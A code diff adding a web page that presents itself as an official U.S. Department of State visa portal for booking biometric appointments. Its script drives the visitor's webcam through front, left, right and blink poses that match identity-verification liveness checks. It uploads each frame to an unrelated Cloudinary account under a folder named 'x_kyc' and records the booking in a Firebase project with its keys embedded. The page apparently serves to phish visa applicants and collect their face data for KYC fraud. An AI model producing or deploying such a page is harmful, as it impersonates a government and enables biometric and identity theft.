@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Biometric Appointment — U.S. Visa Portal</title>
+<link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:wght@400;600;700&family=Inter:wght@400;500;600&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--blue:#002868;--blue2:#003a99;--red:#BF0A30;--gold:#C9A84C;--white:#fff;--offwhite:#F0F4FA;--text:#1A1A2E;--muted:#5a6480;--border:#d0d8e8;--green:#1a6b3a;--serif:'Source Serif 4',Georgia,serif;--sans:'Inter',system-ui,sans-serif;--mono:'Roboto Mono',monospace;--radius:6px;--shadow:0 2px 16px rgba(0,40,104,.10)}
+body{font-family:var(--sans);color:var(--text);background:var(--offwhite);min-height:100vh}
+.gov-banner{background:#1a1a1a;color:#eee;font-size:12px;padding:5px 20px}
+nav{background:var(--blue);padding:0 24px;display:flex;align-items:center;justify-content:space-between;height:60px}
+.nav-brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:#fff}
+.nav-brand strong{font-family:var(--serif);font-size:15px}
+.nav-back{color:rgba(255,255,255,.75);text-decoration:none;font-size:13px}
+.nav-back:hover{color:#fff}
+
+.main{max-width:840px;margin:0 auto;padding:50px 20px 70px}
+.page-title{text-align:center;margin-bottom:36px}
+.page-title h1{font-family:var(--serif);font-size:30px;color:var(--blue);font-weight:700}
+.page-title p{color:var(--muted);font-size:14px;margin-top:8px;max-width:520px;margin-left:auto;margin-right:auto}
+
+.lookup-card{background:#fff;border-radius:10px;padding:24px;box-shadow:var(--shadow);border:1px solid var(--border);margin-bottom:24px}
+.lookup-row{display:flex;gap:12px;align-items:flex-end;flex-wrap:wrap}
+.lookup-row .field{flex:1;min-width:220px}
+.lookup-row label{display:block;font-size:12px;font-weight:600;color:var(--text);margin-bottom:6px;text-transform:uppercase;letter-spacing:.3px}
+.lookup-row input{width:100%;padding:12px 14px;border:1.5px solid var(--border);border-radius:var(--radius);font-family:var(--mono);font-size:14px;outline:none}
+.lookup-row input:focus{border-color:var(--blue)}
+.lookup-row button{background:var(--blue);color:#fff;border:none;padding:12px 24px;border-radius:var(--radius);font-weight:600;cursor:pointer;font-size:14px}
+
+#bookingArea{display:none}
+.notice{background:#fff8e1;border-left:3px solid var(--gold);padding:14px 18px;border-radius:0 var(--radius) var(--radius) 0;font-size:13px;color:#5a4000;margin-bottom:20px;line-height:1.6}
+
+.card{background:#fff;border:1px solid var(--border);border-radius:8px;padding:26px;margin-bottom:20px;box-shadow:var(--shadow)}
+.card-title{font-family:var(--serif);font-size:17px;color:var(--blue);font-weight:600;margin-bottom:18px;display:flex;align-items:center;gap:8px}
+
+.location-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin-bottom:8px}
+.loc-card{border:1.5px solid var(--border);border-radius:8px;padding:16px;cursor:pointer;transition:all .2s}
+.loc-card:hover{border-color:var(--blue)}
+.loc-card.selected{border-color:var(--blue);background:rgba(0,40,104,.04)}
+.loc-card .loc-name{font-weight:600;font-size:14px;color:var(--blue)}
+.loc-card .loc-addr{font-size:12px;color:var(--muted);margin-top:4px}
+
+.cal-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(90px,1fr));gap:10px;margin-top:10px}
+.cal-day{border:1.5px solid var(--border);border-radius:var(--radius);padding:12px 8px;text-align:center;cursor:pointer;transition:all .2s}
+.cal-day:hover{border-color:var(--blue)}
+.cal-day.selected{border-color:var(--blue);background:var(--blue);color:#fff}
+.cal-day .dow{font-size:10px;text-transform:uppercase;opacity:.7}
+.cal-day .dnum{font-size:18px;font-weight:700;margin:4px 0}
+.cal-day .dmon{font-size:10px}
+
+.time-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(90px,1fr));gap:10px;margin-top:14px}
+.time-slot{border:1.5px solid var(--border);border-radius:var(--radius);padding:10px;text-align:center;cursor:pointer;font-size:13px;font-family:var(--mono);transition:all .2s}
+.time-slot:hover{border-color:var(--blue)}
+.time-slot.selected{border-color:var(--blue);background:var(--blue);color:#fff}
+.time-slot.full{opacity:.35;cursor:not-allowed;text-decoration:line-through}
+
+.checklist{list-style:none}
+.checklist li{display:flex;gap:10px;padding:8px 0;font-size:13px;color:var(--text)}
+.checklist li::before{content:'✓';color:var(--green);font-weight:700}
+
+.btn{padding:13px 28px;border-radius:var(--radius);font-weight:600;font-size:14px;border:none;cursor:pointer;width:100%}
+.btn-primary{background:var(--red);color:#fff}
+.btn-primary:hover{background:#a00826}
+.btn-primary:disabled{background:#ccc;cursor:not-allowed}
+
+.confirm-card{background:#fff;border-radius:10px;padding:40px 32px;text-align:center;box-shadow:var(--shadow);border:1px solid var(--border)}
+.confirm-icon{font-size:50px;margin-bottom:16px}
+.confirm-detail{background:var(--offwhite);border-radius:8px;padding:20px;margin:20px 0;text-align:left;font-size:13px;line-height:2}
+
+/* CAMERA CAPTURE */
+.cam-stage{position:relative;background:#0d1a35;border-radius:10px;overflow:hidden;max-width:360px;margin:0 auto}
+.cam-video{width:100%;display:block;transform:scaleX(-1);background:#000}
+.cam-canvas{display:none}
+.cam-frame-guide{position:absolute;inset:0;pointer-events:none;border:3px solid rgba(255,255,255,.0)}
+.cam-oval{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:62%;height:78%;border:3px dashed rgba(255,255,255,.55);border-radius:50%;pointer-events:none}
+.cam-instruction-bar{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(0deg,rgba(0,0,0,.75),transparent);padding:18px 16px 14px;text-align:center}
+.cam-instruction-icon{font-size:30px;margin-bottom:4px}
+.cam-instruction-text{color:#fff;font-size:14px;font-weight:600}
+.cam-not-started{padding:50px 20px;text-align:center}
+.cam-not-started .icon{font-size:40px;margin-bottom:14px}
+.cam-not-started p{color:var(--muted);font-size:13px;margin-bottom:18px;max-width:300px;margin-left:auto;margin-right:auto}
+.cam-start-btn{background:var(--blue);color:#fff;border:none;padding:12px 26px;border-radius:var(--radius);font-weight:600;cursor:pointer;font-size:14px}
+.cam-controls{display:flex;justify-content:center;margin-top:18px}
+.cam-capture-btn{width:64px;height:64px;border-radius:50%;border:4px solid var(--blue);background:#fff;cursor:pointer;position:relative}
+.cam-capture-btn::after{content:'';position:absolute;inset:6px;border-radius:50%;background:var(--red)}
+.cam-capture-btn:disabled{opacity:.4;cursor:not-allowed}
+.cam-progress{display:flex;justify-content:center;gap:8px;margin-top:16px}
+.cam-progress-dot{width:32px;height:32px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:14px;color:var(--muted);background:#fff}
+.cam-progress-dot.done{border-color:var(--green);background:var(--green);color:#fff}
+.cam-progress-dot.current{border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,40,104,.15)}
+.cam-thumbs{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:18px;max-width:360px;margin-left:auto;margin-right:auto}
+.cam-thumb{aspect-ratio:1;border-radius:6px;overflow:hidden;border:1.5px solid var(--border);background:var(--offwhite)}
+.cam-thumb img{width:100%;height:100%;object-fit:cover}
+.cam-thumb.empty{display:flex;align-items:center;justify-content:center;font-size:11px;color:var(--muted)}
+.cam-complete-banner{display:flex;align-items:center;gap:10px;background:#d4f5dd;color:var(--green);padding:14px 16px;border-radius:var(--radius);font-size:13px;font-weight:600;margin-top:16px}
+.cam-retake{text-align:center;margin-top:14px}
+.cam-retake button{background:none;border:none;color:var(--blue);font-size:12px;cursor:pointer;text-decoration:underline}
+</style>
+</head>
+<body>
+
+<div class="gov-banner">🇺🇸 An official website of the United States Government — U.S. Department of State</div>
+<nav>
+  <a href="index.html" class="nav-brand">
+    <svg width="32" height="32" viewBox="0 0 100 100" fill="none"><circle cx="50" cy="50" r="48" fill="#C9A84C" opacity=".15" stroke="#C9A84C" stroke-width="1.5"/><text x="50" y="58" text-anchor="middle" font-size="30" fill="#C9A84C" font-family="serif">★</text></svg>
+    <strong>U.S. Visa Portal</strong>
+  </a>
+  <a href="index.html" class="nav-back">← Back to Home</a>
+</nav>
+
+<div class="main">
+  <div class="page-title">
+    <h1>📷 Biometric Appointment</h1>
+    <p>Schedule your fingerprint and photo enrollment at a U.S. Embassy or Consulate near you.</p>
+  </div>
+
+  <div class="lookup-card">
+    <div class="lookup-row">
+      <div class="field">
+        <label>Application Reference Number</label>
+        <input type="text" id="refInput" placeholder="e.g. US-2024-A1B2C3"/>
+      </div>
+      <button onclick="lookupApp()">Find Application</button>
+    </div>
+  </div>
+
+  <div id="lookupMsg"></div>
+
+  <div id="bookingArea">
+    <div class="notice">
+      ℹ️ Biometric appointments require <strong>fee payment to be completed</strong>. Bring your passport and printed confirmation to your appointment.
+    </div>
+
+    <div class="card">
+      <div class="card-title">📷 1. Biometric Photo Capture</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:18px">Complete a quick guided photo capture. You'll be asked to look straight, turn your head, and blink — this is reviewed by an officer before your in-person appointment.</p>
+
+      <div id="camNotStarted" class="cam-not-started">
+        <div class="icon">🎥</div>
+        <p>Camera access is required for biometric photo capture. Your photos are stored securely and only visible to consular staff.</p>
+        <button class="cam-start-btn" onclick="startCamera()">Enable Camera →</button>
+      </div>
+
+      <div id="camStage" style="display:none">
+        <div class="cam-stage">
+          <video id="camVideo" class="cam-video" autoplay playsinline muted></video>
+          <canvas id="camCanvas" class="cam-canvas"></canvas>
+          <div class="cam-oval"></div>
+          <div class="cam-instruction-bar">
+            <div class="cam-instruction-icon" id="camIcon">😐</div>
+            <div class="cam-instruction-text" id="camInstruction">Look straight at the camera</div>
+          </div>
+        </div>
+        <div class="cam-controls">
+          <button class="cam-capture-btn" id="camCaptureBtn" onclick="captureStep()" title="Capture"></button>
+        </div>
+        <div class="cam-progress" id="camProgress"></div>
+      </div>
+
+      <div class="cam-thumbs" id="camThumbs"></div>
+      <div id="camCompleteBanner"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">📍 2. Select Embassy / Consulate</div>
+      <div class="location-grid" id="locGrid"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">📅 3. Select Date</div>
+      <div class="cal-grid" id="calGrid"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">🕐 4. Select Time</div>
+      <div class="time-grid" id="timeGrid"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">📋 What to Bring</div>
+      <ul class="checklist">
+        <li>Valid passport (original)</li>
+        <li>Printed appointment confirmation</li>
+        <li>Application reference number</li>
+        <li>Visa fee payment receipt</li>
+        <li>One passport-style photograph</li>
+      </ul>
+    </div>
+
+    <button class="btn btn-primary" id="confirmBtn" onclick="confirmBooking()" disabled>Confirm Biometric Appointment →</button>
+  </div>
+
+  <div id="confirmArea" style="display:none"></div>
+</div>
+
+<script type="module">
+import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js';
+import { getFirestore, doc, getDoc, setDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js';
+
+const FB = {apiKey:"AIzaSyAQbiR_7vvcUlr0nr3NKQ2csjh-iwe0rhY",authDomain:"visa-3504e.firebaseapp.com",projectId:"visa-3504e",storageBucket:"visa-3504e.firebasestorage.app",messagingSenderId:"618621727677",appId:"1:618621727677:web:72dccc703c97a5c739d8d4"};
+const app = initializeApp(FB);
+const db = getFirestore(app);
+
+const CLOUDINARY = {cloud_name:'dbgxllxdb', upload_preset:'efootball_screenshots'};
+
+let currentApp = null;
+let selectedLoc = null, selectedDate = null, selectedTime = null;
+let camStream = null;
+let camStepIndex = 0;
+let captureComplete = false;
+const capturedShots = {}; // stepId -> {dataUrl, url}
+
+const CAPTURE_STEPS = [
+  {id:'front', icon:'😐', instruction:'Look straight at the camera'},
+  {id:'right', icon:'👉', instruction:'Slowly turn your head to the right'},
+  {id:'left',  icon:'👈', instruction:'Slowly turn your head to the left'},
+  {id:'blink', icon:'😉', instruction:'Blink both eyes, then look straight'}
+];
+
+const LOCATIONS = [
+  {id:'lagos', name:'U.S. Embassy — Lagos', addr:'2 Walter Carrington Cres, Victoria Island'},
+  {id:'abuja', name:'U.S. Embassy — Abuja', addr:'Plot 1075 Diplomatic Drive, Central District'},
+  {id:'london', name:'U.S. Embassy — London', addr:'33 Nine Elms Lane, London'},
+  {id:'accra', name:'U.S. Embassy — Accra', addr:'Independence Avenue, Accra'}
+];
+
+const TIMES = ['8:00 AM','8:30 AM','9:00 AM','9:30 AM','10:00 AM','10:30 AM','11:00 AM','1:00 PM','1:30 PM','2:00 PM','2:30 PM','3:00 PM'];
+
+// ===== BIOMETRIC CAMERA CAPTURE =====
+window.startCamera = async function(){
+  try{
+    camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user', width:{ideal:480}, height:{ideal:480}}, audio:false});
+    document.getElementById('camVideo').srcObject = camStream;
+    document.getElementById('camNotStarted').style.display='none';
+    document.getElementById('camStage').style.display='block';
+    camStepIndex = 0;
+    renderCamStep();
+    renderCamProgress();
+  } catch(e){
+    alert('Camera access was denied or is unavailable. Please allow camera access to continue.');
+  }
+};
+
+function renderCamStep(){
+  const step = CAPTURE_STEPS[camStepIndex];
+  if(!step) return;
+  document.getElementById('camIcon').textContent = step.icon;
+  document.getElementById('camInstruction').textContent = step.instruction;
+}
+
+function renderCamProgress(){
+  document.getElementById('camProgress').innerHTML = CAPTURE_STEPS.map((s,i)=>{
+    let cls = '';
+    if(capturedShots[s.id]) cls = 'done';
+    else if(i===camStepIndex) cls = 'current';
+    return `<div class="cam-progress-dot ${cls}">${capturedShots[s.id]?'✓':i+1}</div>`;
+  }).join('');
+}
+
+function renderCamThumbs(){
+  document.getElementById('camThumbs').innerHTML = CAPTURE_STEPS.map(s=>{
+    const shot = capturedShots[s.id];
+    return shot
+      ? `<div class="cam-thumb"><img src="${shot.dataUrl}"/></div>`
+      : `<div class="cam-thumb empty">${s.icon}</div>`;
+  }).join('');
+}
+
+window.captureStep = async function(){
+  const step = CAPTURE_STEPS[camStepIndex];
+  const video = document.getElementById('camVideo');
+  const canvas = document.getElementById('camCanvas');
+  const btn = document.getElementById('camCaptureBtn');
+  canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  // Mirror the capture to match the preview the user sees
+  ctx.translate(canvas.width,0); ctx.scale(-1,1);
+  ctx.drawImage(video,0,0,canvas.width,canvas.height);
+  const dataUrl = canvas.toDataURL('image/jpeg',0.85);
+
+  capturedShots[step.id] = {dataUrl, url:null};
+  renderCamThumbs();
+  renderCamProgress();
+
+  btn.disabled = true;
+  canvas.toBlob(async (blob)=>{
+    try{
+      const fd = new FormData();
+      fd.append('file', blob, `${step.id}.jpg`);
+      fd.append('upload_preset', CLOUDINARY.upload_preset);
+      fd.append('folder', `x_kyc/${appRefFromUrl()}`);
+      const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY.cloud_name}/image/upload`,{method:'POST',body:fd});
+      const data = await res.json();
+      if(data.secure_url) capturedShots[step.id].url = data.secure_url;
+    } catch(e){ /* keep local preview even if upload fails; retry happens on confirm */ }
+    btn.disabled = false;
+  }, 'image/jpeg', 0.85);
+
+  if(camStepIndex < CAPTURE_STEPS.length - 1){
+    camStepIndex++;
+    renderCamStep();
+    renderCamProgress();
+  } else {
+    captureComplete = true;
+    finishCapture();
+  }
+};
+
+window.retakeCapture = async function(){
+  Object.keys(capturedShots).forEach(k=>delete capturedShots[k]);
+  captureComplete = false;
+  camStepIndex = 0;
+  document.getElementById('camCompleteBanner').innerHTML = '';
+  checkReady();
+  await startCamera(); // stream was stopped after completion — get a fresh one
+};
+
+function finishCapture(){
+  document.getElementById('camStage').style.display='none';
+  document.getElementById('camCompleteBanner').innerHTML = `
+    <div class="cam-complete-banner">✅ Biometric photo capture complete</div>
+    <div class="cam-retake"><button onclick="retakeCapture()">Retake photos</button></div>
+  `;
+  if(camStream){ camStream.getTracks().forEach(t=>t.stop()); }
+  checkReady();
+}
+
+function appRefFromUrl(){
+  return currentApp ? currentApp.ref : 'unassigned';
+}
+
+function waitForUploads(maxMs=6000){
+  const start = Date.now();
+  return new Promise(resolve=>{
+    const check = ()=>{
+      const allDone = CAPTURE_STEPS.every(s=> capturedShots[s.id] && capturedShots[s.id].url);
+      if(allDone || Date.now()-start > maxMs) return resolve();
+      setTimeout(check, 200);
+    };
+    check();
+  });
+}
+
+window.lookupApp = async function(){
+  const ref = document.getElementById('refInput').value.trim().toUpperCase();
+  const msg = document.getElementById('lookupMsg');
+  if(!ref) return;
+  msg.innerHTML = '<p style="text-align:center;color:var(--muted);padding:16px">⏳ Looking up application...</p>';
+  try{
+    const snap = await getDoc(doc(db,'visa_applications',ref));
+    if(!snap.exists()){
+      msg.innerHTML = '<p style="text-align:center;color:var(--red);padding:16px">Application not found. Please check your reference number.</p>';
+      document.getElementById('bookingArea').style.display='none';
+      return;
+    }
+    currentApp = {ref, ...snap.data()};
+    if(!currentApp.feePaid){
+      msg.innerHTML = '<p style="text-align:center;color:var(--red);padding:16px">⚠️ Fee payment must be completed before scheduling biometrics. <a href="apply.html" style="color:var(--blue)">Complete payment →</a></p>';
+      document.getElementById('bookingArea').style.display='none';
+      return;
+    }
+    if(currentApp.biometricScheduled){
+      msg.innerHTML = `<p style="text-align:center;color:var(--green);padding:16px">✅ Your biometric appointment is already scheduled for ${currentApp.biometricDate||''} at ${currentApp.biometricLocation||''}.</p>`;
+      document.getElementById('bookingArea').style.display='none';
+      return;
+    }
+    msg.innerHTML = '';
+    document.getElementById('bookingArea').style.display='block';
+    buildLocations();
+    buildCalendar();
+    buildTimes();
+  } catch(e){
+    msg.innerHTML = '<p style="text-align:center;color:var(--red);padding:16px">Error retrieving application. Please try again.</p>';
+  }
+};
+
+function buildLocations(){
+  document.getElementById('locGrid').innerHTML = LOCATIONS.map(l=>`
+    <div class="loc-card" data-id="${l.id}" onclick="selectLoc('${l.id}')">
+      <div class="loc-name">${l.name}</div>
+      <div class="loc-addr">${l.addr}</div>
+    </div>
+  `).join('');
+}
+window.selectLoc = function(id){
+  selectedLoc = LOCATIONS.find(l=>l.id===id);
+  document.querySelectorAll('.loc-card').forEach(c=>c.classList.toggle('selected', c.dataset.id===id));
+  checkReady();
+};
+
+function buildCalendar(){
+  const days = [];
+  const dow = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+  const mon = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+  let d = new Date();
+  d.setDate(d.getDate()+5); // earliest slot 5 days out
+  let count = 0;
+  while(count < 10){
+    if(d.getDay()!==0 && d.getDay()!==6){ // skip weekends
+      days.push(new Date(d));
+      count++;
+    }
+    d.setDate(d.getDate()+1);
+  }
+  document.getElementById('calGrid').innerHTML = days.map(dt=>{
+    const iso = dt.toISOString().split('T')[0];
+    return `<div class="cal-day" data-date="${iso}" onclick="selectDate('${iso}')">
+      <div class="dow">${dow[dt.getDay()]}</div>
+      <div class="dnum">${dt.getDate()}</div>
+      <div class="dmon">${mon[dt.getMonth()]}</div>
+    </div>`;
+  }).join('');
+}
+window.selectDate = function(iso){
+  selectedDate = iso;
+  document.querySelectorAll('.cal-day').forEach(c=>c.classList.toggle('selected', c.dataset.date===iso));
+  checkReady();
+};
+
+function buildTimes(){
+  document.getElementById('timeGrid').innerHTML = TIMES.map(t=>`
+    <div class="time-slot" data-time="${t}" onclick="selectTime('${t}')">${t}</div>
+  `).join('');
+}
+window.selectTime = function(t){
+  selectedTime = t;
+  document.querySelectorAll('.time-slot').forEach(c=>c.classList.toggle('selected', c.dataset.time===t));
+  checkReady();
+};
+
+function checkReady(){
+  document.getElementById('confirmBtn').disabled = !(captureComplete && selectedLoc && selectedDate && selectedTime);
+}
+
+window.confirmBooking = async function(){
+  const btn = document.getElementById('confirmBtn');
+  btn.disabled = true; btn.textContent = 'Finalizing photos...';
+  await waitForUploads();
+  btn.textContent = 'Booking...';
+  try{
+    const biometricPhotos = {};
+    Object.entries(capturedShots).forEach(([k,v])=>{ if(v.url) biometricPhotos[k] = v.url; });
+
+    await setDoc(doc(db,'visa_applications',currentApp.ref),{
+      status:'biometric_scheduled',
+      biometricScheduled:true,
+      biometricLocation:selectedLoc.name,
+      biometricDate:selectedDate,
+      biometricTime:selectedTime,
+      biometricPhotos,
+      biometricCaptureComplete:true,
+      updatedAt:serverTimestamp()
+    },{merge:true});
+
+    document.getElementById('bookingArea').style.display='none';
+    document.getElementById('confirmArea').style.display='block';
+    document.getElementById('confirmArea').innerHTML = `
+      <div class="confirm-card">
+        <div class="confirm-icon">✅</div>
+        <h2 style="font-family:var(--serif);font-size:24px;color:var(--blue)">Appointment Confirmed</h2>
+        <div class="confirm-detail">
+          <div><strong>Reference:</strong> ${currentApp.ref}</div>
+          <div><strong>Location:</strong> ${selectedLoc.name}</div>
+          <div><strong>Address:</strong> ${selectedLoc.addr}</div>
+          <div><strong>Date:</strong> ${new Date(selectedDate).toLocaleDateString('en-US',{weekday:'long',year:'numeric',month:'long',day:'numeric'})}</div>
+          <div><strong>Time:</strong> ${selectedTime}</div>
+        </div>
+        <p style="font-size:12px;color:var(--muted)">A confirmation email has been sent. Please arrive 15 minutes early with all required documents.</p>
+        <div style="display:flex;gap:12px;justify-content:center;margin-top:24px">
+          <a href="status.html?ref=${currentApp.ref}" class="btn btn-primary" style="width:auto;text-decoration:none;display:inline-block">Track Application</a>
+        </div>
+      </div>
+    `;
+  } catch(e){
+    alert('Failed to confirm appointment. Please try again.');
+    btn.disabled = false; btn.textContent = 'Confirm Biometric Appointment →';
+  }
+};
+
+// Auto-lookup if ref in URL
+const urlRef = new URLSearchParams(window.location.search).get('ref');
+if(urlRef){
+  document.getElementById('refInput').value = urlRef;
+  lookupApp();
+}
+document.getElementById('refInput').addEventListener('keydown', e=>{ if(e.key==='Enter') lookupApp(); });
+</script>
+</body>
+</html>
